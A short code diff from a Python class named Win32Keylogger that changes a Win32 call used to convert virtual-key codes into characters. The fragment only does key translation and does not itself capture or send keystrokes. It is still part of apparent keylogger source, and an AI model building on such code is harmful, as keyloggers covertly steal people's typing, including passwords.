@@ -165,7 +165,7 @@ class Win32Keylogger:
         
         buf = ctypes.create_unicode_buffer(5)
         scan = self.user32.MapVirtualKeyW(vk, 0)
-        res = self.user32.ToUnicodeW(vk, scan, ctypes.byref(state), buf, len(buf), 0)
+        res = self.user32.ToUnicode(vk, scan, ctypes.byref(state), buf, len(buf), 0)
         
         if res > 0:
             return buf.value
